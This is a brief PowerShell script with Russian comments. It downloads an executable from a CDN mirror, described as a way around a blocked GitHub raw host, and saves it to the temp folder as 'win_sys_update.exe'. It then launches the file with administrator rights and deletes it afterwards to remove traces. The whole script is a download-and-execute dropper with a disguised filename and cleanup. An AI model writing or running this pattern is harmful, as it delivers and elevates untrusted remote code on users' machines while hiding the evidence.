# Используем зеркало jsdelivr вместо заблокированного raw.githubusercontent
$url = "https://jsdelivr.net"
$path = "$env:LOCALAPPDATA\Temp\win_sys_update.exe"

# Скачивание файла во временную папку
Invoke-WebRequest -Uri $url -OutFile $path

# Запуск от администратора и моментальное удаление скриптом самого себя из памяти после закрытия
Start-Process -FilePath $path -Verb RunAs -Wait
Remove-Item -Path $path -Force
